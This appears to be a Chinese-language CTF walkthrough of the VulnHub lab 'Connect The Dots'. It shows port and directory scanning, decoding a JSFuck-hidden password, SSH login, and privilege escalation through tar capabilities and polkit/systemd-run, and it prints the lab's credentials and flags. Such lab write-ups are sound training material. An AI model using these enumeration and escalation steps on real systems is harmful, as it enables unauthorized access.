## 靶机信息

级别:容易
下载地址:https://download.vulnhub.com/connectthedots/Connect-The-Dots.ova
- User flag: user.txt
- Root flag: root.txt

## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.146

sudo nmap --min-rate 10000 -sT -p- 192.168.1.146 -oA tcp_scan/ports
//Ports:
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
7822/tcp  open  unknown
36079/tcp open  unknown
48701/tcp open  unknown
49591/tcp open  unknown
58011/tcp open  unknown

//对端口信息进行处理
cat tcp_scan/ports.nmap | grep open | awk -F '/' '{print $1}' | tr '\n\r' ','
//端口服务版本扫描
2049/tcp  open  nfs      3-4 (RPC #100003)
7822/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)

//这个靶机nfs服务是兔子洞
```

## Web
![[Pasted image 20231010114425.png]]
```shell
得到用户名 norris
路径 ../../mysite/register.html

```

![[Pasted image 20231010114820.png]]
### 目录爆破
```shell
gobuster dir -u http://192.168.1.146/ -w /usr/share/wordlists/dirb/common.txt -x txt
/hits.txt             (Status: 200) [Size: 44]
```

![[Pasted image 20231010115039.png]]

![[Pasted image 20231010115155.png]]
打开bootstrap.min.cs是一串jsfuck
![[Pasted image 20231010115331.png]]
```shell
// 去掉多余内容，jsfuck.com解码后得到登录凭证
You're smart enough to understand me. Here's your secret, TryToGuessThisNorris@2k19
```
尝试在网页端使用此凭证登录失败，使用ssh登录成功
```shell
ssh norris@192.168.1.146 -p 7822
// passwd:TryToGuessThisNorris@2k19

得到user flag: 2c2836a138c0e7f7529aa0764a6414d0
```

## 提权
```shell
find / -type f -perm -ug=rwx 2>/dev/null //没有找到可以用的文件
在/var/www/html目录下发现了 secretfile .secretfile.swp
下载.secretfile.swp文件到本地  http://192.168.1.146/.secretfile.swp
strings .secretfile.swp 得到密码
 ```
 ![[Pasted image 20231010122712.png]]
 可能是morris的密码
 ```shell
 find / -perm -4000 –type f 2>/dev/null
 // -perm 按权限查找 -4000 有suid权限的
```

## 通过tar得到root flag
```shell
/sbin/getcap -r / 2>/dev/null
```
![[Pasted image 20231010125850.png]]
```shell
tar -zcvf root.tar.gz /root
tar -xzvf root.tar.gz //得到了root文件夹里的内容
root flag:8fc9376d961670ca10be270d52eda423
```

## polkit提权
> 原理: policykit，一个权限管理系统 systemd-run -t /bin/bash 需要高权限才能执行,此时会调用polickit-helper
```shell
find / -type f -perm -u=s 2>/dev/null
# /usr/lib/policykit-1/polkit-agent-helper-1

systemd-run -t /bin/bash (输入密码有时间限制)

root flag:8fc9376d961670ca10be270d52eda423
//
```
